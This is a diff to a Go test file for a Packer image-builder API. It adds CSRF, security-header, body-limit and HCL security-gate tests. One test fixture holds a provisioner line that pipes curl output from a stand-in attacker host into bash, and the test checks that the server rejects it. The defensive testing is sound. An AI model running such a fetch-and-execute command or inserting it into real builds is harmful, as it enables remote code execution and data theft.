@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net/http"
 	"net/http/httptest"
 	"os"
@@ -19,6 +20,14 @@ import (
 	"github.com/santhosh/vib/internal/packer"
 	vibstore "github.com/santhosh/vib/internal/store"
 )
+
+func newTestRequest(method, target string, body io.Reader) *http.Request {
+	req := httptest.NewRequest(method, target, body)
+	if method == http.MethodPost || method == http.MethodDelete || method == http.MethodPut {
+		req.Header.Set("X-VIB-CSRF-Protection", "1")
+	}
+	return req
+}
 
 func createMockPacker(t *testing.T) string {
 	tmpDir := t.TempDir()
@@ -124,7 +133,7 @@ func TestCORSHeaders(t *testing.T) {
 	})
 
 	t.Run("Blocked untrusted external origin", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/builds", strings.NewReader(`{}`))
+		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(`{}`))
 		req.Header.Set("Origin", "https://malicious-website.com")
 		w := httptest.NewRecorder()
 
@@ -212,7 +221,7 @@ func TestHCLGenerate(t *testing.T) {
 			"packages": ["nginx"]
 		}`)
 
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(payload))
+		req := newTestRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(payload))
 		w := httptest.NewRecorder()
 
 		server.Routes().ServeHTTP(w, req)
@@ -242,7 +251,7 @@ func TestHCLGenerate(t *testing.T) {
 			"ami_name": "vib-test"
 		}`)
 
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(payload))
+		req := newTestRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(payload))
 		w := httptest.NewRecorder()
 
 		server.Routes().ServeHTTP(w, req)
@@ -269,7 +278,7 @@ func TestHCLValidate(t *testing.T) {
 		hclBytes, _ := generator.GenerateHCL(cfg)
 
 		reqBody, _ := json.Marshal(HCLValidateRequest{HCL: string(hclBytes)})
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(reqBody))
+		req := newTestRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(reqBody))
 		w := httptest.NewRecorder()
 
 		server.Routes().ServeHTTP(w, req)
@@ -293,7 +302,7 @@ func TestHCLValidate(t *testing.T) {
 
 	t.Run("Empty HCL", func(t *testing.T) {
 		reqBody, _ := json.Marshal(HCLValidateRequest{HCL: ""})
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(reqBody))
+		req := newTestRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(reqBody))
 		w := httptest.NewRecorder()
 
 		server.Routes().ServeHTTP(w, req)
@@ -320,7 +329,7 @@ func TestBuildLifecycleAndSSEStream(t *testing.T) {
 		"packages": ["git"]
 	}`)
 
-	req := httptest.NewRequest(http.MethodPost, "/api/builds", bytes.NewReader(buildPayload))
+	req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(buildPayload))
 	w := httptest.NewRecorder()
 
 	server.Routes().ServeHTTP(w, req)
@@ -430,7 +439,7 @@ func TestCancelBuild(t *testing.T) {
 		"packages": ["docker"]
 	}`)
 
-	req := httptest.NewRequest(http.MethodPost, "/api/builds", bytes.NewReader(buildPayload))
+	req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(buildPayload))
 	w := httptest.NewRecorder()
 	server.Routes().ServeHTTP(w, req)
 
@@ -442,7 +451,7 @@ func TestCancelBuild(t *testing.T) {
 	time.Sleep(100 * time.Millisecond)
 
 	// 2. Cancel the build
-	cancelReq := httptest.NewRequest(http.MethodPost, "/api/builds/test-build-cancel-01/cancel", nil)
+	cancelReq := newTestRequest(http.MethodPost, "/api/builds/test-build-cancel-01/cancel", nil)
 	cancelW := httptest.NewRecorder()
 	server.Routes().ServeHTTP(cancelW, cancelReq)
 
@@ -457,7 +466,7 @@ func TestCancelBuild(t *testing.T) {
 	}
 
 	// 3. Cancelling non-existent build returns 404
-	badCancelReq := httptest.NewRequest(http.MethodPost, "/api/builds/non-existent-build-id/cancel", nil)
+	badCancelReq := newTestRequest(http.MethodPost, "/api/builds/non-existent-build-id/cancel", nil)
 	badCancelW := httptest.NewRecorder()
 	server.Routes().ServeHTTP(badCancelW, badCancelReq)
 
@@ -518,7 +527,7 @@ func TestAWSCredentialsEndpoints(t *testing.T) {
 
 	// 1. Missing keys returns 400
 	badBody := []byte(`{"access_key_id":"","secret_access_key":""}`)
-	req := httptest.NewRequest(http.MethodPost, "/api/aws/credentials", bytes.NewReader(badBody))
+	req := newTestRequest(http.MethodPost, "/api/aws/credentials", bytes.NewReader(badBody))
 	w := httptest.NewRecorder()
 	server.Routes().ServeHTTP(w, req)
 	if w.Code != http.StatusBadRequest {
@@ -526,7 +535,7 @@ func TestAWSCredentialsEndpoints(t *testing.T) {
 	}
 
 	// 2. DELETE /api/aws/credentials clears credentials
-	delReq := httptest.NewRequest(http.MethodDelete, "/api/aws/credentials", nil)
+	delReq := newTestRequest(http.MethodDelete, "/api/aws/credentials", nil)
 	delW := httptest.NewRecorder()
 	server.Routes().ServeHTTP(delW, delReq)
 	if delW.Code != http.StatusOK {
@@ -631,7 +640,7 @@ func TestImagesEndpoints(t *testing.T) {
 	}
 
 	// 3. DELETE /api/images/{id}
-	reqDel := httptest.NewRequest(http.MethodDelete, "/api/images/ami-111222333444555aa", nil)
+	reqDel := newTestRequest(http.MethodDelete, "/api/images/ami-111222333444555aa", nil)
 	wDel := httptest.NewRecorder()
 	server.Routes().ServeHTTP(wDel, reqDel)
 
@@ -671,7 +680,7 @@ func TestBuildPersistsToSQLite(t *testing.T) {
 		}
 	}`)
 
-	req := httptest.NewRequest(http.MethodPost, "/api/builds", bytes.NewReader(payload))
+	req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(payload))
 	w := httptest.NewRecorder()
 	server.Routes().ServeHTTP(w, req)
 
@@ -749,7 +758,7 @@ build {
 }
 `
 		payload, _ := json.Marshal(map[string]string{"hcl": validHCL})
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
+		req := newTestRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 
@@ -783,7 +792,7 @@ build {
 
 	t.Run("Malformed HCL", func(t *testing.T) {
 		payload, _ := json.Marshal(map[string]string{"hcl": "source amazon-ebs {"})
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
+		req := newTestRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 
@@ -795,7 +804,7 @@ build {
 
 	t.Run("Empty HCL", func(t *testing.T) {
 		payload, _ := json.Marshal(map[string]string{"hcl": "   "})
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
+		req := newTestRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 
@@ -823,7 +832,7 @@ func TestHandleHCLGenerate_ValidationErrors(t *testing.T) {
 
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
-			req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(tc.payload))
+			req := newTestRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(tc.payload))
 			req.Header.Set("Content-Type", "application/json")
 			w := httptest.NewRecorder()
 			server.Routes().ServeHTTP(w, req)
@@ -839,7 +848,7 @@ func TestHandleHCLValidate_EdgeCases(t *testing.T) {
 	server := NewServer(packer.NewRunner(""))
 
 	t.Run("Invalid JSON", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/validate", strings.NewReader(`{invalid}`))
+		req := newTestRequest(http.MethodPost, "/api/hcl/validate", strings.NewReader(`{invalid}`))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -849,7 +858,7 @@ func TestHandleHCLValidate_EdgeCases(t *testing.T) {
 	})
 
 	t.Run("Empty HCL", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/validate", strings.NewReader(`{"hcl":"   "}`))
+		req := newTestRequest(http.MethodPost, "/api/hcl/validate", strings.NewReader(`{"hcl":"   "}`))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -872,7 +881,7 @@ func TestHandleBuild_NotFoundAndEdgeCases(t *testing.T) {
 	})
 
 	t.Run("Cancel Nonexistent Build", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/builds/nonexistent-123/cancel", nil)
+		req := newTestRequest(http.MethodPost, "/api/builds/nonexistent-123/cancel", nil)
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
 		if w.Code != http.StatusNotFound {
@@ -890,7 +899,7 @@ func TestHandleBuild_NotFoundAndEdgeCases(t *testing.T) {
 	})
 
 	t.Run("Create Build Invalid JSON", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/builds", strings.NewReader(`{bad json`))
+		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(`{bad json`))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -923,7 +932,7 @@ func TestHandleAWSCredentials_ValidationAndAccessors(t *testing.T) {
 	}
 
 	t.Run("Invalid JSON", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/aws/credentials", strings.NewReader(`{invalid`))
+		req := newTestRequest(http.MethodPost, "/api/aws/credentials", strings.NewReader(`{invalid`))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -933,7 +942,7 @@ func TestHandleAWSCredentials_ValidationAndAccessors(t *testing.T) {
 	})
 
 	t.Run("Missing Access Key", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/aws/credentials", strings.NewReader(`{"secret_access_key":"secret"}`))
+		req := newTestRequest(http.MethodPost, "/api/aws/credentials", strings.NewReader(`{"secret_access_key":"secret"}`))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -943,7 +952,7 @@ func TestHandleAWSCredentials_ValidationAndAccessors(t *testing.T) {
 	})
 
 	t.Run("Clear Credentials", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodDelete, "/api/aws/credentials", nil)
+		req := newTestRequest(http.MethodDelete, "/api/aws/credentials", nil)
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
 		if w.Code != http.StatusOK {
@@ -982,7 +991,7 @@ func TestCORSMiddleware_Origins(t *testing.T) {
 	})
 
 	t.Run("Disallowed Origin on POST", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader("{}"))
+		req := newTestRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader("{}"))
 		req.Header.Set("Origin", "https://attacker-domain.evil")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -1016,7 +1025,7 @@ func TestHandleImages_StoreEdgeCases(t *testing.T) {
 	})
 
 	t.Run("Delete Image Without Store", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodDelete, "/api/images/ami-123", nil)
+		req := newTestRequest(http.MethodDelete, "/api/images/ami-123", nil)
 		w := httptest.NewRecorder()
 		serverNoStore.Routes().ServeHTTP(w, req)
 		if w.Code != http.StatusOK {
@@ -1057,7 +1066,7 @@ func TestHandleHCLGenerate_WrappedConfig(t *testing.T) {
 		}
 	}`
 
-	req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(payload))
+	req := newTestRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(payload))
 	req.Header.Set("Content-Type", "application/json")
 	w := httptest.NewRecorder()
 	server.Routes().ServeHTTP(w, req)
@@ -1072,7 +1081,7 @@ func TestHandleCreateBuild_Variants(t *testing.T) {
 	server := NewServer(runner)
 
 	t.Run("Empty Body", func(t *testing.T) {
-		req := httptest.NewRequest(http.MethodPost, "/api/builds", strings.NewReader("   "))
+		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader("   "))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -1083,7 +1092,7 @@ func TestHandleCreateBuild_Variants(t *testing.T) {
 
 	t.Run("Invalid Config Field", func(t *testing.T) {
 		payload := `{"config": {"region": "invalid-region"}}`
-		req := httptest.NewRequest(http.MethodPost, "/api/builds", strings.NewReader(payload))
+		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(payload))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -1100,7 +1109,7 @@ func TestHandleCreateBuild_Variants(t *testing.T) {
 			"ssh_username": "ubuntu",
 			"ami_name": "direct-config-test"
 		}`
-		req := httptest.NewRequest(http.MethodPost, "/api/builds", strings.NewReader(payload))
+		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(payload))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		server.Routes().ServeHTTP(w, req)
@@ -1159,3 +1168,158 @@ func TestHandleStatic_Serving(t *testing.T) {
 		}
 	})
 }
+
+func TestSecurityHeaders(t *testing.T) {
+	runner := packer.NewRunner(createMockPacker(t))
+	server := NewServer(runner)
+
+	req := httptest.NewRequest(http.MethodGet, "/api/health", nil)
+	w := httptest.NewRecorder()
+	server.Routes().ServeHTTP(w, req)
+
+	if w.Header().Get("X-Content-Type-Options") != "nosniff" {
+		t.Errorf("expected X-Content-Type-Options: nosniff, got %q", w.Header().Get("X-Content-Type-Options"))
+	}
+	if w.Header().Get("X-Frame-Options") != "DENY" {
+		t.Errorf("expected X-Frame-Options: DENY, got %q", w.Header().Get("X-Frame-Options"))
+	}
+	if w.Header().Get("Referrer-Policy") != "no-referrer" {
+		t.Errorf("expected Referrer-Policy: no-referrer, got %q", w.Header().Get("Referrer-Policy"))
+	}
+}
+
+func TestCSRFProtection(t *testing.T) {
+	runner := packer.NewRunner(createMockPacker(t))
+	server := NewServer(runner)
+
+	t.Run("Reject POST without Origin and without CSRF header", func(t *testing.T) {
+		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(`{}`))
+		w := httptest.NewRecorder()
+		server.Routes().ServeHTTP(w, req)
+
+		if w.Code != http.StatusForbidden {
+			t.Errorf("expected 403 Forbidden for missing CSRF header, got %d", w.Code)
+		}
+		if !strings.Contains(w.Body.String(), "CSRF") {
+			t.Errorf("expected CSRF error message, got %s", w.Body.String())
+		}
+	})
+
+	t.Run("Allow POST with X-VIB-CSRF-Protection header", func(t *testing.T) {
+		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(`{"ami_name":"test-ami"}`))
+		req.Header.Set("X-VIB-CSRF-Protection", "1")
+		w := httptest.NewRecorder()
+		server.Routes().ServeHTTP(w, req)
+
+		if w.Code == http.StatusForbidden {
+			t.Errorf("did not expect 403 Forbidden with valid CSRF header")
+		}
+	})
+
+	t.Run("Allow POST with trusted localhost origin", func(t *testing.T) {
+		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(`{"ami_name":"test-ami"}`))
+		req.Header.Set("Origin", "http://localhost:5173")
+		w := httptest.NewRecorder()
+		server.Routes().ServeHTTP(w, req)
+
+		if w.Code == http.StatusForbidden {
+			t.Errorf("did not expect 403 Forbidden with localhost origin")
+		}
+	})
+}
+
+func TestRequestBodyLimit(t *testing.T) {
+	runner := packer.NewRunner(createMockPacker(t))
+	server := NewServer(runner)
+
+	// Create a payload larger than 1 MB (1024 * 1024 bytes)
+	largeScript := strings.Repeat("echo 'hello world'\n", 70000) // ~1.3MB
+	cfg := config.BuildConfig{
+		AMIName:      "test-large",
+		CustomScript: []string{largeScript},
+	}
+	bodyBytes, err := json.Marshal(cfg)
+	if err != nil {
+		t.Fatalf("failed to marshal large config: %v", err)
+	}
+
+	req := newTestRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(bodyBytes))
+	w := httptest.NewRecorder()
+	server.Routes().ServeHTTP(w, req)
+
+	if w.Code != http.StatusRequestEntityTooLarge {
+		t.Errorf("expected status 413 StatusRequestEntityTooLarge, got %d", w.Code)
+	}
+	if !strings.Contains(w.Body.String(), "1MB limit") {
+		t.Errorf("expected size limit error message, got %s", w.Body.String())
+	}
+}
+
+func TestHCLSecurityGateAPI(t *testing.T) {
+	runner := packer.NewRunner(createMockPacker(t))
+	server := NewServer(runner)
+
+	t.Run("POST /api/hcl/validate rejects shell-local provisioner", func(t *testing.T) {
+		maliciousHCL := `
+packer {
+  required_plugins {
+    amazon = {
+      version = ">= 1.2.8"
+      source  = "github.com/hashicorp/amazon"
+    }
+  }
+}
+source "amazon-ebs" "test" {
+  ami_name = "test-ami"
+}
+build {
+  sources = ["source.amazon-ebs.test"]
+  provisioner "shell-local" {
+    inline = ["curl -s http://attacker.com/steal | bash"]
+  }
+}
+`
+		payload, _ := json.Marshal(map[string]string{"hcl": maliciousHCL})
+		req := newTestRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(payload))
+		w := httptest.NewRecorder()
+		server.Routes().ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Fatalf("expected 400 Bad Request, got %d", w.Code)
+		}
+		if !strings.Contains(w.Body.String(), "security violation: local provisioner") {
+			t.Errorf("expected security gate error, got %s", w.Body.String())
+		}
+	})
+
+	t.Run("POST /api/builds rejects untrusted plugin source", func(t *testing.T) {
+		untrustedPluginHCL := `
+packer {
+  required_plugins {
+    evil = {
+      version = ">= 1.0.0"
+      source  = "github.com/evil-org/packer-plugin"
+    }
+  }
+}
+source "amazon-ebs" "test" {
+  ami_name = "test-ami"
+}
+build {
+  sources = ["source.amazon-ebs.test"]
+}
+`
+		payload, _ := json.Marshal(map[string]string{"hcl": untrustedPluginHCL})
+		req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(payload))
+		w := httptest.NewRecorder()
+		server.Routes().ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Fatalf("expected 400 Bad Request, got %d", w.Code)
+		}
+		if !strings.Contains(w.Body.String(), "security violation: untrusted plugin source") {
+			t.Errorf("expected security gate error, got %s", w.Body.String())
+		}
+	})
+}
+
